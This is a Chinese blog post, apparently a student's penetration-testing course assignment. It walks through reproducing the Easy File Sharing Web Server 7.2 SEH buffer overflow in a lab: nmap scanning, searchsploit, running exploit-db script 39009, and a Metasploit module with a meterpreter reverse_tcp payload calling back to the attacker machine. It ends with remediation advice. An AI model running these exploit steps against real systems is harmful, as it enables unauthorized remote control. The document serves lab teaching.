@@ -1,0 +1,397 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>网络渗透课程作业：Easy File Sharing 远程缓冲区溢出漏洞复现 | Qu0rtz-blip 的博客</title><meta name="author" content="Qu0rtz-blip"><meta name="copyright" content="Qu0rtz-blip"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Easy File Sharing Web Server 远程溢出漏洞复现 对应课程：漏洞扫描与测试模块 + 课本 P170 7.4目标软件：Easy File Sharing Web Server 7.2（HTTP 服务，存在远程缓冲区溢出漏洞）  0. 实验环境   角色 系统 说明    攻击机 Kali Linux 运行 nmap &#x2F; searchsploit &#x2F; MS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络渗透课程作业：Easy File Sharing 远程缓冲区溢出漏洞复现">
+<meta property="og:url" content="http://example.com/2026/11/06/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/index.html">
+<meta property="og:site_name" content="Qu0rtz-blip 的博客">
+<meta property="og:description" content="Easy File Sharing Web Server 远程溢出漏洞复现 对应课程：漏洞扫描与测试模块 + 课本 P170 7.4目标软件：Easy File Sharing Web Server 7.2（HTTP 服务，存在远程缓冲区溢出漏洞）  0. 实验环境   角色 系统 说明    攻击机 Kali Linux 运行 nmap &#x2F; searchsploit &#x2F; MS">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-11-06T08:55:00.000Z">
+<meta property="article:modified_time" content="2026-11-09T05:39:24.723Z">
+<meta property="article:author" content="Qu0rtz-blip">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="缓冲区溢出">
+<meta property="article:tag" content="Metasploit">
+<meta property="article:tag" content="Windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "网络渗透课程作业：Easy File Sharing 远程缓冲区溢出漏洞复现",
+  "url": "http://example.com/2026/11/06/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/",
+  "image": "http://example.com/img/butterfly-icon.png",
+  "datePublished": "2026-11-06T08:55:00.000Z",
+  "dateModified": "2026-11-09T05:39:24.723Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Qu0rtz-blip",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/11/06/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        try {
+          const data = { value }
+
+          if (ttl != null) {
+            data.expiry = Date.now() + ttl * 86400000
+          }
+
+          localStorage.setItem(key, JSON.stringify(data))
+        } catch (e) {
+          console.error(e)
+        }
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '网络渗透课程作业：Easy File Sharing 远程缓冲区溢出漏洞复现',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Qu0rtz-blip 的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">网络渗透课程作业：Easy File Sharing 远程缓冲区溢出漏洞复现</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">网络渗透课程作业：Easy File Sharing 远程缓冲区溢出漏洞复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-06T08:55:00.000Z" title="发表于 2026-11-06 16:55:00">2026-11-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-09T05:39:24.723Z" title="更新于 2026-11-09 13:39:24">2026-11-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Easy-File-Sharing-Web-Server-远程溢出漏洞复现"><a href="#Easy-File-Sharing-Web-Server-远程溢出漏洞复现" class="headerlink" title="Easy File Sharing Web Server 远程溢出漏洞复现"></a>Easy File Sharing Web Server 远程溢出漏洞复现</h1><blockquote>
+<p>对应课程：漏洞扫描与测试模块 + 课本 P170 7.4<br>目标软件：Easy File Sharing Web Server 7.2（HTTP 服务，存在远程缓冲区溢出漏洞）</p>
+</blockquote>
+<h2 id="0-实验环境"><a href="#0-实验环境" class="headerlink" title="0. 实验环境"></a>0. 实验环境</h2><table>
+<thead>
+<tr>
+<th>角色</th>
+<th>系统</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击机</td>
+<td>Kali Linux</td>
+<td>运行 nmap &#x2F; searchsploit &#x2F; MSF &#x2F; Python 脚本</td>
+</tr>
+<tr>
+<td>靶机</td>
+<td>Windows 10 x64虚拟机</td>
+<td>安装 Easy File Sharing Web Server 7.2，开放 80 端口</td>
+</tr>
+</tbody></table>
+<p>靶机 Easy File Sharing Web Server 启动界面如下：</p>
+<p><img src="/images/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/images/01-start.png"></p>
+<p>可以通过 IP 地址远程访问</p>
+<p><img src="/images/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/images/02-remote.png"></p>
+<hr>
+<h2 id="1-信息收集：Nmap-扫描目标"><a href="#1-信息收集：Nmap-扫描目标" class="headerlink" title="1. 信息收集：Nmap 扫描目标"></a>1. 信息收集：Nmap 扫描目标</h2><p>先对靶机做端口扫描，确认目标在线并识别开放服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.169.131</span><br></pre></td></tr></table></figure>
+
+<p><code>-sV</code> 用于探测服务版本。扫描结果中可看到 80 端口开放，服务指纹为 Easy File Sharing HTTP Server：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">80/tcp open http Easy File Sharing HTTP Server 7.2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/images/03-nmap.png"></p>
+<blockquote>
+<p>说明：nmap 是靠收集服务返回的特征（HTTP 响应头、banner、特定字符串等）来匹配自带的指纹库（<code>nmap-service-probes</code>），而Easy File Sharing 从 6.9 到 7.2 的网络响应特征几乎没变，指纹库里这条特征标注的是 6.9，于是就匹配成了 6.9，真实版本号以软件 About 界面为准</p>
+</blockquote>
+<p><img src="/images/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/images/04-version.png"></p>
+<hr>
+<h2 id="2-1-漏洞查找：searchsploit"><a href="#2-1-漏洞查找：searchsploit" class="headerlink" title="2.1 漏洞查找：searchsploit"></a>2.1 漏洞查找：searchsploit</h2><p>Kali 自带 exploit-db 漏洞库，使用 <code>searchsploit</code> 按软件名查找可用的渗透模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Easy File Sharing</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/images/05-searchsploit.png"></p>
+<p>输出结果中包含针对该软件的多个 exploit，例如 HTTP 服务的 SEH 溢出、FTP 服务的 PASS 溢出等：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Easy File Sharing FTP Server 2.0 (Windows 2000 SP4) - &#x27;PASS&#x27; Remote Overflow </span><br><span class="line">Easy File Sharing Web Server 7.2 - GET &#x27;PassWD&#x27; Remote Buffer Overflow (SEH) </span><br></pre></td></tr></table></figure>
+
+<p>这里介绍一个网站，可以在线查找漏洞，和 Kali 里的 <code>searchsploit</code>数据同源。</p>
+<blockquote>
+<p>在线漏洞库地址：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com</a></p>
+</blockquote>
+<p><img src="/images/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/images/11-exploit_db.png"></p>
+<p>可以在线查看漏洞的 EDB 编号和脚本内容。</p>
+<h3 id="2-2-searchsploit-中多个-exploit-的区别"><a href="#2-2-searchsploit-中多个-exploit-的区别" class="headerlink" title="2.2 searchsploit 中多个 exploit 的区别"></a>2.2 searchsploit 中多个 exploit 的区别</h3><p>searchsploit 列出了大量针对 7.2 的脚本，它们的区别体现在三个维度：触发点、利用技术、攻击范围。</p>
+<p><strong>（1）触发点不同</strong>：软件有多个输入字段都未做长度检查，每个可溢出的入口对应一个独立 exploit。</p>
+<table>
+<thead>
+<tr>
+<th>触发点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>GET</td>
+<td>从 URL 的 GET 请求触发</td>
+</tr>
+<tr>
+<td>POST</td>
+<td>从 POST 提交数据触发</td>
+</tr>
+<tr>
+<td>HEAD</td>
+<td>从 HTTP HEAD 方法触发</td>
+</tr>
+<tr>
+<td>UserID &#x2F; PassWD</td>
+<td>从用户 ID、密码修改字段触发</td>
+</tr>
+<tr>
+<td>New User &#x2F; Account Import</td>
+<td>从注册新用户、账户导入功能触发</td>
+</tr>
+</tbody></table>
+<p><strong>（2）利用技术不同</strong>：针对不同防护和缓冲区大小采用不同手法。</p>
+<table>
+<thead>
+<tr>
+<th>技术</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SEH</td>
+<td>覆盖结构化异常处理，借异常机制劫持执行流</td>
+</tr>
+<tr>
+<td>DEP Bypass + ROP</td>
+<td>用 ROP gadgets 绕过数据执行保护（DEP）</td>
+</tr>
+<tr>
+<td>Egghunter</td>
+<td>缓冲区过小时，用小段代码在内存中搜索完整 shellcode</td>
+</tr>
+<tr>
+<td>Stack Buffer Overflow</td>
+<td>直接覆盖栈返回地址</td>
+</tr>
+</tbody></table>
+<p><strong>（3）攻击范围与脚本类型不同</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>分类</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击范围</td>
+<td>remote（远程网络发包，本文采用）&#x2F; local（需已在本机操作，多用于提权）</td>
+</tr>
+<tr>
+<td>脚本类型</td>
+<td>.py（Python 手动利用）&#x2F; .rb（Metasploit 模块）&#x2F; .txt（说明类）</td>
+</tr>
+</tbody></table>
+<p>本文只复现其中一条远程 SEH 利用线（Python 39009，HEAD请求触发）与一个 MSF 模块，其余脚本原理相通，无需逐一复现。</p>
+<hr>
+<h2 id="3-攻击方式一：Python-脚本利用"><a href="#3-攻击方式一：Python-脚本利用" class="headerlink" title="3. 攻击方式一：Python 脚本利用"></a>3. 攻击方式一：Python 脚本利用</h2><p>searchsploit 找到的 Python exploit 本质是向目标 HTTP 服务发送精心构造的超长请求，触发缓冲区溢出。</p>
+<h3 id="3-1-查看脚本参数"><a href="#3-1-查看脚本参数" class="headerlink" title="3.1 查看脚本参数"></a>3.1 查看脚本参数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/exploitdb/exploits/windows/remote/39009.py</span><br></pre></td></tr></table></figure>
+
+<p>脚本头部一般标注了用法、目标版本和需要填写的回连地址与端口。如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: Easy File Sharing Web Server 7.2 - HEAD HTTP request SEH Buffer Overflow</span></span><br><span class="line"><span class="comment"># Date: 12/2/2015</span></span><br><span class="line"><span class="comment"># Exploit Author: ArminCyber</span></span><br><span class="line"><span class="comment"># Contact: Armin.Exploit@gmail.com</span></span><br><span class="line"><span class="comment"># Version: 7.2</span></span><br><span class="line"><span class="comment"># Tested on: XP SP3 EN</span></span><br><span class="line"><span class="comment"># category: Remote Exploit</span></span><br><span class="line"><span class="comment"># Usage: ./exploit.py ip port</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>说明：该脚本是用 <strong>shikata_ga_nai</strong> 编码的 <code>windows/exec CMD=calc.exe</code> shellcode，若靶机上弹出 Windows 计算器，证明漏洞利用成功。</p>
+</blockquote>
+<h3 id="3-2-执行攻击脚本"><a href="#3-2-执行攻击脚本" class="headerlink" title="3.2 执行攻击脚本"></a>3.2 执行攻击脚本</h3><p>按照注释要求，传入靶机IP地址和服务端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 /usr/share/exploitdb/exploits/windows/remote/39009.py 192.168.10.131 80</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：部分老脚本基于 Python 2 编写，需用 <code>python2</code> 执行；若系统无 python2，可用 <code>python3</code> 版本的同类 exploit 或做语法适配。</p>
+</blockquote>
+<p><img src="/images/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/images/06-python-done.png"></p>
+<p><img src="/images/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/images/15-calc.png"></p>
+<p>在靶机上弹出计算器，说明攻击成功。</p>
+<hr>
+<h2 id="4-攻击方式二：Metasploit-利用"><a href="#4-攻击方式二：Metasploit-利用" class="headerlink" title="4. 攻击方式二：Metasploit 利用"></a>4. 攻击方式二：Metasploit 利用</h2><p>使用 MSF 内置的 <code>easyfilesharing_seh</code> 模块，通过 SEH 覆盖触发溢出，配合 reverse_tcp 载荷拿到 meterpreter。</p>
+<h3 id="4-1-启动-MSF-并查找模块"><a href="#4-1-启动-MSF-并查找模块" class="headerlink" title="4.1 启动 MSF 并查找模块"></a>4.1 启动 MSF 并查找模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search EasyFileSharing</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/images/07-msf_start.png"></p>
+<p><img src="/images/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/images/08-msf_search.png"></p>
+<h3 id="4-2-加载模块"><a href="#4-2-加载模块" class="headerlink" title="4.2 加载模块"></a>4.2 加载模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/http/easyfilesharing_seh</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-查看需要配置的参数"><a href="#4-3-查看需要配置的参数" class="headerlink" title="4.3 查看需要配置的参数"></a>4.3 查看需要配置的参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/images/12-show_options.png"></p>
+<h3 id="4-4-设置攻击载荷"><a href="#4-4-设置攻击载荷" class="headerlink" title="4.4 设置攻击载荷"></a>4.4 设置攻击载荷</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-5-填写参数"><a href="#4-5-填写参数" class="headerlink" title="4.5 填写参数"></a>4.5 填写参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 192.168.10.131    # 靶机 IP</span><br><span class="line">set RPORT 80                 # 目标 HTTP 端口</span><br><span class="line">set LHOST 192.168.10.129    # 攻击机 IP（回连地址）</span><br><span class="line">set LPORT 4444               # 回连端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/images/09-msf_set.png"></p>
+<h3 id="4-6-确认参数后执行"><a href="#4-6-确认参数后执行" class="headerlink" title="4.6 确认参数后执行"></a>4.6 确认参数后执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>成功后输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse TCP handler on 192.168.169.130:4444</span><br><span class="line">[*] 192.168.169.131:80 - Sending exploit...</span><br><span class="line">[+] Exploit Sent</span><br><span class="line">[*] Sending stage (957487 bytes) to 192.168.169.131</span><br><span class="line">[*] Meterpreter session 1 opened</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/images/10-msf_success.png"></p>
+<h3 id="4-7-验证控制权限"><a href="#4-7-验证控制权限" class="headerlink" title="4.7 验证控制权限"></a>4.7 验证控制权限</h3><p>进入 meterpreter 后执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
+
+<p>可查看目标系统信息和当前权限，确认已实现远程控制。</p>
+<p><img src="/images/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/images/14-uid.png"></p>
+<hr>
+<h2 id="5-原理"><a href="#5-原理" class="headerlink" title="5. 原理"></a>5. 原理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap 识别服务版本</span><br><span class="line">      ↓</span><br><span class="line">searchsploit 匹配已知漏洞</span><br><span class="line">      ↓</span><br><span class="line">缓冲区溢出（SEH 覆盖）劫持执行流</span><br><span class="line">      ↓</span><br><span class="line">payload 反弹连接 → 拿到 shell / meterpreter</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>漏洞根因</strong>：Easy File Sharing Web Server 对用户输入长度缺少边界检查，超长请求触发缓冲区溢出。</li>
+<li><strong>SEH 覆盖</strong>：通过覆盖结构化异常处理（SEH）记录，劫持程序异常处理流程，跳转到恶意 shellcode。</li>
+<li><strong>reverse_tcp</strong>：靶机主动回连攻击机，可绕过目标对入站连接的限制。</li>
+</ul>
+<h2 id="6-修复建议"><a href="#6-修复建议" class="headerlink" title="6. 修复建议"></a>6. 修复建议</h2><ol>
+<li>停止使用该老旧版本，升级到官方最新版或更换同类软件。</li>
+<li>对服务端口做访问控制，仅允许可信主机访问。</li>
+<li>主机部署防火墙规则，限制 80 端口的外部连接。</li>
+<li>及时安装系统补丁，关闭不必要的服务。</li>
+</ol>
+<hr>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Qu0rtz-blip</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/11/06/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/">http://example.com/2026/11/06/EasyFileSharing%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8D%9A%E5%AE%A2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Qu0rtz-blip 的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><a class="post-meta__tags" href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">缓冲区溢出</a><a class="post-meta__tags" href="/tags/Metasploit/">Metasploit</a><a class="post-meta__tags" href="/tags/Windows/">Windows</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/11/06/Meterpreter%20%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E4%B8%8E%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%A4%8D%E7%8E%B0/" title="网络渗透课程作业：Meterpreter 远程控制与一句话木马"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">网络渗透课程作业：Meterpreter 远程控制与一句话木马</div></div><div class="info-2"><div class="info-item-1">Meterpreter 远程控制与一句话木马复现 对应课程：ch6 远程控制（PPT 第 9-10 页 + 作业）内容：msfvenom 生成被控端并远程控制、微步云沙箱检测、一句话木马与蚁剑连接  0. 